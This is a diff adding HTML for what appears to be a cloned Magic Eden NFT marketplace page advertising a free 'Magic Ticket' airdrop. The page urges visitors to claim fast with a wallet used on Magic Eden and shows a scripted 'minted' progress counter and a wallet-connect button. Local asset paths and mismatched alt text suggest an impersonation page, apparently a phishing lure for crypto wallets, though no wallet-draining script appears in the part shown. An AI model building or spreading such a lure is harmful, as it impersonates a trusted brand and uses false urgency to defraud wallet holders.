+                                                                <path d="M14.6231 7.69141C14.4705 7.69141 14.3213 7.73666 14.1944 7.82145C14.0675 7.90623 13.9686 8.02674 13.9103 8.16773C13.8519 8.30872 13.8366 8.46385 13.8664 8.61352C13.8962 8.76318 13.9697 8.90065 14.0776 9.00854C14.1855 9.11642 14.323 9.18988 14.4727 9.21962C14.6224 9.24935 14.7775 9.23404 14.9185 9.1756C15.0595 9.11717 15.1799 9.01824 15.2647 8.89134C15.3494 8.76443 15.3946 8.61524 15.3946 8.46264C15.3944 8.25812 15.313 8.06203 15.1683 7.91744C15.0237 7.77284 14.8276 7.69155 14.6231 7.69141Z" fill="#F5F3F7"></path>
+                                                                <path d="M14.6231 12.5254C15.0492 12.5254 15.3946 12.18 15.3946 11.7539C15.3946 11.3278 15.0492 10.9824 14.6231 10.9824C14.197 10.9824 13.8516 11.3278 13.8516 11.7539C13.8516 12.18 14.197 12.5254 14.6231 12.5254Z" fill="#F5F3F7"></path>
+                                                                <path d="M13.0977 9.33691C12.9451 9.33691 12.7959 9.38216 12.669 9.46694C12.5422 9.55171 12.4433 9.6722 12.3849 9.81317C12.3265 9.95415 12.3112 10.1093 12.341 10.2589C12.3708 10.4086 12.4442 10.5461 12.5521 10.6539C12.66 10.7618 12.7975 10.8353 12.9472 10.8651C13.0968 10.8949 13.2519 10.8796 13.3929 10.8212C13.5339 10.7628 13.6544 10.6639 13.7392 10.537C13.8239 10.4102 13.8692 10.261 13.8692 10.1084C13.869 9.90386 13.7876 9.70775 13.643 9.56312C13.4983 9.41848 13.3022 9.33713 13.0977 9.33691Z" fill="#F5F3F7"></path>
+                                                                <path d="M16.0762 10.8799C16.2288 10.8799 16.3779 10.8347 16.5048 10.7499C16.6317 10.6651 16.7306 10.5446 16.789 10.4037C16.8474 10.2627 16.8626 10.1076 16.8329 9.9579C16.8031 9.80825 16.7296 9.67078 16.6217 9.56288C16.5138 9.45499 16.3764 9.38151 16.2267 9.35174C16.077 9.32197 15.9219 9.33725 15.7809 9.39564C15.64 9.45403 15.5195 9.55292 15.4347 9.67979C15.3499 9.80666 15.3047 9.95583 15.3047 10.1084C15.3049 10.313 15.3863 10.5091 15.5309 10.6537C15.6755 10.7984 15.8716 10.8797 16.0762 10.8799Z" fill="#F5F3F7"></path>
+                                                            </g>
+                                                            <defs>
+                                                                <clipPath id="clip0_522_996">
+                                                                    <rect width="20" height="13.6523" fill="white" transform="translate(0 4)"></rect>
+                                                                </clipPath>
+                                                            </defs>
+                                                        </svg>
+                                                    </span>
+                                                    <span class="tw-text-white-1 tw-ml-2 Sidebar_label__Chew5">Eden Games</span>
+                                                </a>
+                                            </div>
+                                        </li>
+                                        <li class="
+                Sidebar_tab__1lv-Q
+                tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px
+              ">
+                                            <div class="tw-flex tw-flex-col">
+                                                <div class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative tw-rounded tw-items-center
+                  ">
+                                                    <span>
+                                                        <svg width="20px" height="20px" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#F5F3F7">
+                                                            <path d="M10.0003 12.5002C13.222 12.5002 15.8337 9.88849 15.8337 6.66683C15.8337 3.44517 13.222 0.833496 10.0003 0.833496C6.77866 0.833496 4.16699 3.44517 4.16699 6.66683C4.16699 9.88849 6.77866 12.5002 10.0003 12.5002Z" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                            <path d="M6.84134 11.5752L5.83301 19.1669L9.99967 16.6669L14.1663 19.1669L13.158 11.5669" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                        </svg>
+                                                    </span>
+                                                    <span class="tw-text-white-1 tw-ml-2 Sidebar_label__Chew5">Creators</span>
+                                                    <span class="tw-ml-auto">
+                                                        <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="#F5F3F7" height="24" width="24" xmlns="http://www.w3.org/2000/svg" class="tw-transform" style="color: rgb(245, 243, 247);">
+                                                            <polyline points="6 9 12 15 18 9"></polyline>
+                                                        </svg>
+                                                    </span>
+                                                </div>
+                                            </div>
+                                        </li>
+                                        <li class="
+                Sidebar_tab__1lv-Q
+                tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px
+              ">
+                                            <div class="tw-flex tw-flex-col">
+                                                <a href="https://contenthub.magiceden.io/playbook" target="_blank" rel="noreferrer" class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative tw-rounded tw-items-center
+                  ">
+                                                    <span>
+                                                        <svg width="20px" height="20px" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#F5F3F7">
+                                                            <path d="M13.75 2.5V10L11.25 8.125L8.75 10V2.5" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                            <path d="M3.75002 16.875C3.74898 16.6285 3.79678 16.3842 3.89064 16.1563C3.9845 15.9283 4.12257 15.7212 4.29689 15.5469C4.4712 15.3726 4.67831 15.2345 4.90626 15.1406C5.13422 15.0468 5.3785 14.999 5.62502 15H16.25V2.50002H5.62502C5.3785 2.49898 5.13422 2.54678 4.90626 2.64064C4.67831 2.7345 4.4712 2.87257 4.29689 3.04689C4.12257 3.2212 3.9845 3.42831 3.89064 3.65626C3.79678 3.88422 3.74898 4.1285 3.75002 4.37502V16.875Z" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                            <path d="M3.75 16.875V17.5H15" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                        </svg>
+                                                    </span>
+                                                    <span class="tw-text-white-1 tw-ml-2 Sidebar_label__Chew5">Intro to Solana NFTs</span>
+                                                </a>
+                                            </div>
+                                        </li>
+                                        <li class="
+                Sidebar_tab__1lv-Q
+                tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px
+              ">
+                                            <div class="tw-flex tw-flex-col">
+                                                <a href="https://help.magiceden.io/en/" target="_blank" rel="noreferrer" class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative tw-rounded tw-items-center
+                  ">
+                                                    <span>
+                                                        <svg width="20px" height="20px" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#F5F3F7">
+                                                            <path d="M10 17.5C14.1421 17.5 17.5 14.1421 17.5 10C17.5 5.85786 14.1421 2.5 10 2.5C5.85786 2.5 2.5 5.85786 2.5 10C2.5 14.1421 5.85786 17.5 10 17.5Z" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                            <path d="M10.4375 14.0625C10.4375 14.3041 10.2416 14.5 10 14.5C9.75838 14.5 9.5625 14.3041 9.5625 14.0625C9.5625 13.8209 9.75838 13.625 10 13.625C10.2416 13.625 10.4375 13.8209 10.4375 14.0625Z" fill="#120C18" stroke="#F5F3F7"></path>
+                                                            <path d="M10 11.25V10.625C10.4326 10.625 10.8556 10.4967 11.2153 10.2563C11.575 10.016 11.8554 9.67433 12.021 9.27462C12.1866 8.87491 12.2299 8.43507 12.1455 8.01074C12.0611 7.58641 11.8527 7.19663 11.5468 6.89071C11.2409 6.58478 10.8511 6.37644 10.4268 6.29203C10.0024 6.20763 9.56259 6.25095 9.16288 6.41651C8.76317 6.58208 8.42153 6.86246 8.18116 7.22219C7.94079 7.58192 7.8125 8.00485 7.8125 8.4375" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                        </svg>
+                                                    </span>
+                                                    <span class="tw-text-white-1 tw-ml-2 Sidebar_label__Chew5">Support</span>
+                                                </a>
+                                            </div>
+                                        </li>
+                                        <li class="
+                Sidebar_tab__1lv-Q
+                tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px
+              ">
+                                            <div class="tw-flex tw-flex-col">
+                                                <div class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative tw-rounded tw-items-center
+                  ">
+                                                    <span>
+                                                        <svg width="20px" height="20px" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#F5F3F7">
+                                                            <path d="M13.9772 7.80055L15.0499 9.06097C15.1727 9.20254 15.2816 9.31899 15.3257 9.38521C15.6465 9.70404 15.8264 10.135 15.8261 10.584C15.796 11.1137 15.4508 11.4745 15.131 11.8604L14.3803 12.7418L13.9888 13.1984C13.9747 13.2142 13.9657 13.2336 13.9627 13.2544C13.9598 13.2752 13.9631 13.2963 13.9722 13.3153C13.9813 13.3342 13.9959 13.3501 14.014 13.361C14.0322 13.3719 14.0532 13.3773 14.0745 13.3765H17.9878C18.5856 13.3765 19.3386 13.8789 19.2946 14.6415C19.2934 14.9881 19.1531 15.3202 18.9044 15.5653C18.6557 15.8104 18.3187 15.9487 17.967 15.9499H11.8387C11.4355 15.9499 10.3512 15.9933 10.0477 15.0685C9.98311 14.8753 9.97428 14.6682 10.0222 14.4703C10.1104 14.1776 10.25 13.9025 10.4346 13.6574C10.7427 13.2007 11.0764 12.744 11.4054 12.3011C11.8294 11.7211 12.265 11.1594 12.6936 10.568C12.7088 10.5487 12.7171 10.525 12.7171 10.5006C12.7171 10.4762 12.7088 10.4525 12.6936 10.4333L11.1366 8.60658C11.1265 8.59334 11.1133 8.5826 11.0983 8.5752C11.0832 8.56781 11.0666 8.56396 11.0497 8.56396C11.0329 8.56396 11.0163 8.56781 11.0012 8.5752C10.9861 8.5826 10.973 8.59334 10.9629 8.60658C10.5458 9.16144 8.72005 11.6183 8.33081 12.1161C7.94156 12.6139 6.98235 12.6413 6.45177 12.1161L4.01666 9.70716C4.0011 9.69178 3.98126 9.6813 3.95965 9.67705C3.93805 9.6728 3.91564 9.67497 3.89529 9.68328C3.87493 9.6916 3.85754 9.70569 3.84533 9.72377C3.83311 9.74184 3.82662 9.76308 3.82667 9.7848V14.4177C3.8324 14.7465 3.73361 15.0688 3.54415 15.3395C3.35469 15.6101 3.08404 15.8156 2.77014 15.927C2.56957 15.9958 2.35522 16.0164 2.14495 15.987C1.93469 15.9575 1.73461 15.879 1.56139 15.7579C1.38818 15.6368 1.24685 15.4766 1.1492 15.2908C1.05154 15.1049 1.00039 14.8988 1 14.6895V6.35975C1.01396 6.05957 1.12356 5.77136 1.31323 5.53607C1.50289 5.30078 1.76298 5.13039 2.05653 5.0491C2.30833 4.98299 2.57338 4.98365 2.82484 5.05102C3.0763 5.11838 3.30521 5.25006 3.4884 5.43271L7.23257 9.12719C7.24378 9.13841 7.25735 9.14707 7.27233 9.15254C7.28731 9.15802 7.30332 9.16018 7.31924 9.15887C7.33516 9.15756 7.3506 9.15282 7.36445 9.14498C7.3783 9.13713 7.39023 9.12638 7.39939 9.11349L10.0592 5.48522C10.1822 5.33793 10.3363 5.2189 10.5108 5.13646C10.6853 5.05403 10.8759 5.01018 11.0694 5.008H17.9878C18.1772 5.00831 18.3642 5.04845 18.5366 5.12575C18.7089 5.20305 18.8625 5.31572 18.9871 5.45622C19.1117 5.59673 19.2044 5.76183 19.259 5.94049C19.3136 6.11914 19.3289 6.30724 19.3038 6.49219C19.2551 6.81302 19.0899 7.10554 18.839 7.31548C18.588 7.52543 18.2683 7.63855 17.9392 7.63387H14.0652C14.0458 7.63434 14.0268 7.63994 14.0103 7.65009C13.9937 7.66025 13.9803 7.67458 13.9713 7.6916C13.9623 7.70862 13.9581 7.72771 13.9591 7.74687C13.9602 7.76603 13.9664 7.78457 13.9772 7.80055Z" fill="#F5F3F7"></path>
+                                                        </svg>
+                                                    </span>
+                                                    <span class="tw-text-white-1 tw-ml-2 Sidebar_label__Chew5">Resources</span>
+                                                    <span class="tw-ml-auto">
+                                                        <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="#F5F3F7" height="24" width="24" xmlns="http://www.w3.org/2000/svg" class="tw-transform" style="color: rgb(245, 243, 247);">
+                                                            <polyline points="6 9 12 15 18 9"></polyline>
+                                                        </svg>
+                                                    </span>
+                                                </div>
+                                            </div>
+                                        </li>
+                                    </ul>
+                                    <div class="tw-flex tw-gap-2 Sidebar_sidebarFooter__2bHEK">
+                                        <div>
+                                            <a href="https://apps.apple.com/us/app/magic-eden-nft-marketplace/id1602924580" target="_blank" rel="noreferrer" class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative
+                    tw-rounded
+                    tw-items-center
+                    tw-border
+                    tw-border-gray-500
+                    tw-mb-2
+                  ">
+                                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#e42575">
+                                                    <path d="M5 3.125L5 16.875C5 17.5654 5.55964 18.125 6.25 18.125L13.75 18.125C14.4404 18.125 15 17.5654 15 16.875L15 3.125C15 2.43464 14.4404 1.875 13.75 1.875L6.25 1.875C5.55965 1.875 5 2.43464 5 3.125Z" fill="#F5F3F7" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                    <path d="M9.9375 14.25C9.38522 14.25 8.9375 14.6977 8.9375 15.25C8.9375 15.8023 9.38522 16.25 9.9375 16.25C10.4898 16.25 10.9375 15.8023 10.9375 15.25C10.9375 14.6977 10.4898 14.25 9.9375 14.25Z" fill="#120C18"></path>
+                                                </svg>
+                                                <span>iOS App</span>
+                                            </a>
+                                            <a href="https://contenthub.magiceden.io/playbook" target="_blank" rel="noreferrer" class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative
+                    tw-rounded
+                    tw-items-center
+                    tw-gap-1
+                    tw-border
+                    tw-border-gray-500
+                    tw-mb-2
+                  ">
+                                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#e42575">
+                                                    <path d="M16.25 1.875H5.625C4.96259 1.87706 4.3279 2.14111 3.85951 2.60951C3.39111 3.0779 3.12706 3.71259 3.125 4.375V17.5C3.125 17.6658 3.19085 17.8247 3.30806 17.9419C3.42527 18.0592 3.58424 18.125 3.75 18.125H15C15.1658 18.125 15.3247 18.0592 15.4419 17.9419C15.5592 17.8247 15.625 17.6658 15.625 17.5C15.625 17.3342 15.5592 17.1753 15.4419 17.0581C15.3247 16.9408 15.1658 16.875 15 16.875H4.375C4.375 16.5435 4.5067 16.2255 4.74112 15.9911C4.97554 15.7567 5.29348 15.625 5.625 15.625H16.25C16.4158 15.625 16.5747 15.5592 16.6919 15.4419C16.8092 15.3247 16.875 15.1658 16.875 15V2.5C16.875 2.33424 16.8092 2.17527 16.6919 2.05806C16.5747 1.94085 16.4158 1.875 16.25 1.875ZM14.375 9.375L12.375 7.875C12.3214 7.83319 12.2554 7.81048 12.1875 7.81048C12.1196 7.81048 12.0536 7.83319 12 7.875L10 9.375V3.125H14.375V9.375Z" fill="#F5F3F7"></path>
+                                                </svg>
+                                                <span>Hub</span>
+                                            </a>
+                                            <a href="https://discord.com/invite/b87UnCy6P2" target="_blank" rel="noreferrer" class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative
+                    tw-rounded
+                    tw-items-center
+                    tw-gap-1
+                    tw-border
+                    tw-border-gray-500
+                    tw-mb-2
+                  ">
+                                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#e42575">
+                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M18.4679 14.2227C18.4679 14.2227 17.2453 16.3416 14.0666 16.4439C14.0666 16.4439 13.5487 15.8153 13.1173 15.2604C15.0015 14.7193 15.7207 13.521 15.7207 13.521C15.1309 13.9159 14.57 14.1936 14.0666 14.3833C13.3473 14.6901 12.6569 14.8947 11.981 15.0119C10.6001 15.2747 9.33438 15.2016 8.25559 14.997C7.4357 14.8364 6.73097 14.6027 6.14124 14.3684C5.81042 14.237 5.45077 14.0764 5.0912 13.8718L5.03486 13.8391L5.01811 13.8314L4.96178 13.7987L4.9042 13.7547L4.50147 13.5061C4.50147 13.5061 5.19194 14.6759 7.01863 15.2307C6.58714 15.7862 6.05491 16.4439 6.05491 16.4439C2.87618 16.3416 1.66797 14.2227 1.66797 14.2227C1.66797 9.51634 3.73916 5.702 3.73916 5.702C5.81042 4.1237 7.78094 4.16711 7.78094 4.16711L7.92477 4.34254C5.33577 5.10256 4.14189 6.25744 4.14189 6.25744C4.14189 6.25744 4.45838 6.08201 4.99053 5.83343C6.52956 5.14656 7.75219 4.95686 8.25559 4.91285L8.50009 4.88371C9.37747 4.76656 10.3699 4.73742 11.4056 4.85398C12.772 5.01514 14.2391 5.42428 15.735 6.25744C15.735 6.25744 14.5987 5.16143 12.1535 4.40142L12.3549 4.16711C12.3549 4.16711 14.3255 4.1237 16.3967 5.702C16.3967 5.702 18.4679 9.51634 18.4679 14.2227ZM5.91108 11.2409C5.91108 10.3495 6.55832 9.61863 7.3782 9.61863C8.19809 9.61863 8.85973 10.3495 8.84532 11.2409C8.84532 12.1324 8.19809 12.8633 7.3782 12.8633C6.57273 12.8633 5.91108 12.1324 5.91108 11.2409ZM11.1611 11.2409C11.1611 10.3495 11.8083 9.61863 12.6282 9.61863C13.4481 9.61863 14.0953 10.3495 14.0953 11.2409C14.0953 12.1324 13.4481 12.8633 12.6282 12.8633C11.8227 12.8633 11.1611 12.1324 11.1611 11.2409Z" fill="#F5F3F7"></path>
+                                                </svg>
+                                                <span>Discord</span>
+                                            </a>
+                                        </div>
+                                        <div>
+                                            <a href="https://blog.magiceden.io/" target="_blank" rel="noreferrer" class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative
+                    tw-rounded
+                    tw-items-center
+                    tw-gap-1
+                    tw-border
+                    tw-border-gray-500
+                    tw-mb-2
+                  ">
+                                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#e42575">
+                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M13.7964 15.8675C14.003 16.0043 14.2693 16.0385 14.5067 15.9545C14.7441 15.8699 14.9186 15.6803 14.9713 15.4505C15.5288 13.0001 16.8814 6.79789 17.389 4.56889C17.4275 4.40089 17.3633 4.22629 17.2222 4.11409C17.081 4.00189 16.8853 3.96949 16.7108 4.03009C14.0203 4.96129 5.73467 7.86829 2.34803 9.04009C2.13308 9.11449 1.9932 9.30769 2.00026 9.51949C2.00796 9.73189 2.16067 9.91609 2.38075 9.97789C3.89955 10.4027 5.89316 10.9937 5.89316 10.9937C5.89316 10.9937 6.82484 13.6247 7.31057 14.9627C7.37152 15.1307 7.51205 15.2627 7.69748 15.3083C7.88228 15.3533 8.07991 15.3059 8.21786 15.1841C8.99811 14.4953 10.2044 13.4303 10.2044 13.4303C10.2044 13.4303 12.4964 15.0017 13.7964 15.8675ZM6.7318 10.6613L7.80913 13.9841L8.04847 11.8799C8.04847 11.8799 12.2109 8.36929 14.5837 6.36829C14.653 6.30949 14.6626 6.21109 14.6049 6.14209C14.5478 6.07309 14.4425 6.05689 14.3636 6.10369C11.6135 7.74589 6.7318 10.6613 6.7318 10.6613Z" fill="#F5F3F7"></path>
+                                                </svg>
+                                                <span>Newsletter</span>
+                                            </a>
+                                            <a href="https://edenhour.simplecast.com/" target="_blank" rel="noreferrer" class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative
+                    tw-rounded
+                    tw-items-center
+                    tw-gap-1
+                    tw-border
+                    tw-border-gray-500
+                    tw-mb-2
+                  ">
+                                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#e42575">
+                                                    <path d="M10 11.25C11.0355 11.25 11.875 10.4105 11.875 9.375C11.875 8.33947 11.0355 7.5 10 7.5C8.96447 7.5 8.125 8.33947 8.125 9.375C8.125 10.4105 8.96447 11.25 10 11.25Z" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                    <path d="M10.2268 17.5H9.77369C9.48416 17.5001 9.20358 17.3996 8.97988 17.2158C8.75618 17.032 8.60322 16.7762 8.54712 16.4922L7.79712 12.7422C7.76134 12.561 7.76615 12.3741 7.81123 12.195C7.8563 12.0158 7.94051 11.8489 8.0578 11.7063C8.17508 11.5636 8.32254 11.4486 8.48955 11.3698C8.65656 11.2909 8.83898 11.25 9.02369 11.25H10.9768C11.1615 11.25 11.3439 11.2909 11.5109 11.3698C11.678 11.4486 11.8254 11.5636 11.9427 11.7063C12.06 11.8489 12.1442 12.0158 12.1893 12.195C12.2343 12.3741 12.2392 12.561 12.2034 12.7422L11.4534 16.4922C11.3973 16.7762 11.2443 17.032 11.0206 17.2158C10.7969 17.3996 10.5163 17.5001 10.2268 17.5V17.5Z" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                    <path d="M5.33594 11.8126C5.04329 11.055 4.93957 10.2376 5.03372 9.43101C5.12788 8.6244 5.41709 7.85287 5.87635 7.18312C6.3356 6.51336 6.95108 5.96555 7.66956 5.58705C8.38805 5.20855 9.18791 5.01074 10 5.01074C10.8121 5.01074 11.612 5.20855 12.3304 5.58705C13.0489 5.96555 13.6644 6.51336 14.1237 7.18312C14.5829 7.85287 14.8721 8.6244 14.9663 9.43101C15.0604 10.2376 14.9567 11.055 14.6641 11.8126" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                    <path d="M5.96875 16.3206C4.60026 15.4483 3.55162 14.1557 2.98024 12.6367C2.40886 11.1178 2.34557 9.45449 2.79988 7.89652C3.25418 6.33856 4.20157 4.96998 5.49982 3.99623C6.79808 3.02248 8.37715 2.49609 10 2.49609C11.6229 2.49609 13.2019 3.02248 14.5002 3.99623C15.7984 4.96998 16.7458 6.33856 17.2001 7.89652C17.6544 9.45449 17.5911 11.1178 17.0198 12.6367C16.4484 14.1557 15.3997 15.4483 14.0313 16.3206" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                </svg>
+                                                <span>Podcast</span>
+                                            </a>
+                                            <a href="https://twitter.com/MagicEden" target="_blank" rel="noreferrer" class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative
+                    tw-rounded
+                    tw-items-center
+                    tw-gap-1
+                    tw-border
+                    tw-border-gray-500
+                    tw-mb-2
+                  ">
+                                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#e42575">
+                                                    <path d="M18 5.87136C17.4113 6.1327 16.7787 6.3087 16.1147 6.38803C16.7927 5.98203 17.3133 5.3387 17.558 4.57203C16.924 4.94803 16.2213 5.22136 15.4733 5.3687C14.8753 4.7307 14.0213 4.33203 13.0773 4.33203C10.958 4.33203 9.40067 6.30936 9.87933 8.36203C7.152 8.22536 4.73333 6.9187 3.114 4.9327C2.254 6.40803 2.668 8.33803 4.12933 9.31536C3.592 9.29803 3.08533 9.1507 2.64333 8.9047C2.60733 10.4254 3.69733 11.848 5.276 12.1647C4.814 12.29 4.308 12.3194 3.79333 12.2207C4.21067 13.5247 5.42267 14.4734 6.86 14.5C5.48 15.582 3.74133 16.0654 2 15.86C3.45267 16.7914 5.17867 17.3347 7.032 17.3347C13.1267 17.3347 16.57 12.1874 16.362 7.5707C17.0033 7.10736 17.56 6.52936 18 5.87136Z" fill="#F5F3F7"></path>
+                                                </svg>
+                                                <span>Twitter</span>
+                                            </a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="tw-relative tw-flex tw-flex-col tw-flex-auto tw-ml-0 content__regular lg:tw-ml-240px">
+                                <div class="tw-max-w-screen-3xl tw-mx-auto tw-my-4 tw-w-full tw-px-8">
+                                    <div class="tw-flex tw-flex-1 tw-flex-col-reverse md:tw-flex-row tw-mx-auto tw-gap-8 tw-justify-between">
+                                        <div class="tw-flex tw-flex-col tw-gap-4 tw-flex-grow md:tw-max-w-[40%]">
+                                            <div class="tw-text-pink-primary fs-12px tw-border tw-border-solid tw-border-pink-primary tw-rounded-md tw-px-2 tw-py-1 tw-w-fit-content tw-tracking-widest">FEATURED LAUNCH
+                  </div>
+                                            <h1 class="mt-1 tw-text-[58px] tw-font-extrabold tw-leading-none">Magic Ticket</h1>
+                                            <div class="tw-inline-flex tw-gap-2 tw-content-center tw-w-fit-content tw-flex-wrap">
+                                                <div class="tw-my-auto" data-tooltipped="" aria-describedby="tippy-tooltip-1" data-original-title="doxxed" style="display: inline;">
+                                                    <div class="tw-text-pink-primary fs-12px tw-h-fit-content tw-my-auto tw-border tw-border-solid tw-border-pink-primary tw-rounded-md tw-px-2 tw-py-1 tw-w-fit-content tw-tracking-widest">DOXXED
+                      </div>
+                                                </div>
+                                                <div class="tw-my-auto" data-tooltipped="" aria-describedby="tippy-tooltip-2" data-original-title="escrow1d" style="display: inline;">
+                                                    <div class="tw-text-pink-primary fs-12px tw-h-fit-content tw-my-auto tw-border tw-border-solid tw-border-pink-primary tw-rounded-md tw-px-2 tw-py-1 tw-w-fit-content tw-tracking-widest">ESCROW 1D
+                      </div>
+                                                </div>
+                                                <div class="tw-border tw-border-solid tw-border-purple-1 tw-p-2 tw-rounded-md tw-text-white-1 tw-h-fit-content tw-text-[14px] tw-flex tw-gap-2 tw-whitespace-nowrap">
+                                                    <span class="tw-font-light">TOTAL ITEMS</span>
+                                                    <span class="tw-font-bold">&nbsp;30,602</span>
+                                                </div>
+                                                <div class="tw-border tw-border-solid tw-border-purple-1 tw-p-2 tw-rounded-md tw-text-white-1 tw-h-fit-content tw-text-[14px] tw-flex tw-gap-2 tw-whitespace-nowrap">
+                                                    <span class="tw-font-light">PRICE</span>
+                                                    <span class="tw-font-bold">FREE ◎</span>
+                                                </div>
+                                                <div class="tw-flex tw-items-center tw-gap-2">
+                                                    <div class="" data-tooltipped="" aria-describedby="tippy-tooltip-3" data-original-title="Website" style="display: inline;">
+                                                        <a target="_blank" rel="noopener noreferrer" href="https://magiceden.io/">
+                                                            <img src="../../media/globe_white.1cc8238d.svg" class="tw-w-6 tw-h-6 hover:tw-opacity-80">
+                                                        </a>
+                                                    </div>
+                                                    <div class="" data-tooltipped="" aria-describedby="tippy-tooltip-4" data-original-title="Discord" style="display: inline;">
+                                                        <a target="_blank" rel="noopener noreferrer" href="https://discord.gg/magiceden">
+                                                            <img src="../../media/discord_white.a80cd7b6.svg" class="tw-w-6 tw-h-6 hover:tw-opacity-80">
+                                                        </a>
+                                                    </div>
+                                                    <div class="" data-tooltipped="" aria-describedby="tippy-tooltip-5" data-original-title="Twitter" style="display: inline;">
+                                                        <a target="_blank" rel="noopener noreferrer" href=" https://twitter.com/magiceden">
+                                                            <img src="../../media/twitter_white.646bf11e.svg" class="tw-w-6 tw-h-6 hover:tw-opacity-80">
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <p class="tw-mb-4 tw-text-gray-light">
+                                                <b>About our drop:</b>
+                                                <br>
+                                                <br>
+                                                We're airdropping Magic Tickets to people who have used Magic Eden. Make sure you claim your ticket with a wallet you've used on Magic Eden before!<br>
+                                                <br>In total, we're airdropping 30,602 tickets. Be quick with claiming before everything has been claimed!
+                    
+                                            </p>
+</p>
+<div class="tw-flex tw-flex-col tw-gap-4">
+    <div class="" data-tooltipped="" aria-describedby="tippy-tooltip-9" data-original-title="Whitelist" style="display: inline;">
+        <div class="tw-flex tw-justify-between tw-items-center">
+            <div></div>
+        </div>
+    </div>
+    <div class="" data-tooltipped="" aria-describedby="tippy-tooltip-13" data-original-title="Public Sale" style="display: inline;">
+        <div class="tw-flex tw-justify-between tw-items-center">
+            <div>
+                <div class="tw-flex tw-items-center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+</div>
+<div class="md:tw-max-w-[50%] tw-flex tw-flex-col tw-items-center tw-w-full tw-flex-grow tw-self-stretch">
+    <div class="overflow-hidden tw-w-full tw-mb-4 tw-flex-grow tw-rounded-3xl">
+        <div>
+            <img src="../../media/0.gif" alt="Heaven Logo" class="tw-object-cover tw-aspect-square tw tw-w-screen tw-flex-grow tw-rounded-3xl overflow-hidden">
+            <img src="../../media/0.gif" width="1" height="1" class="tw-absolute tw-invisible">
+        </div>
+    </div>
+    <div class="tw-w-full">
+        <div class="tw-flex tw-flex-col tw-gap-1 tw-flex-grow 3xl:tw-hidden">
+            <div class="tw-flex tw-items-center tw-justify-between tw-text-[14px] tw-text-gray-5">
+                <span class="">Total minted</span>
+                <span>
+                    <b class="tw-text-white-1" id="proc">74</b>
+                    <b class="tw-text-white-1">%</b>
+                    (<span id="mints">22949</span>
+                    /<span id="maxMints">30602</span>
+                    )
+                </span>
+            </div>
+            <div class="progress-bar__container">
+                <div class="progress-bar__value" style="width: 74%;" id="progress-bar"></div>
+            </div>
+        </div>
+        <div class="tw-flex tw-gap-4 tw-items-center tw-justify-between tw-flex-wrap tw-rounded-lg tw-bg-purple-2 tw-p-4 tw-mt-4">
+            <div class="tw-flex tw-gap-4 tw-mx-auto tw-flex-col tw-w-full tw-items-center">
+                <div class="tw-flex tw-justify-between tw-gap-6 3xl:tw-w-full">
+                    <div id="root" style="display: flex;">
+                        <main>
+                            <div class="sc-dlfnuX bJgQKs">
+                                <button class="MuiButtonBase-root MuiButton-root MuiButton-contained sc-bdfBQB kKVOCU MuiButton-containedPrimary connect-button" tabindex="0" type="button">
+                                    <span class="MuiButton-label">Wallet not connected</span>
+                                    <span class="MuiTouchRipple-root"></span>
+                                </button>
+                            </div>
+                        </main>
+                    </div>
+                    <div class="tw-flex tw-flex-col tw-gap-1 tw-flex-grow tw-hidden 3xl:tw-flex tw-flex-col-reverse tw-self-center">
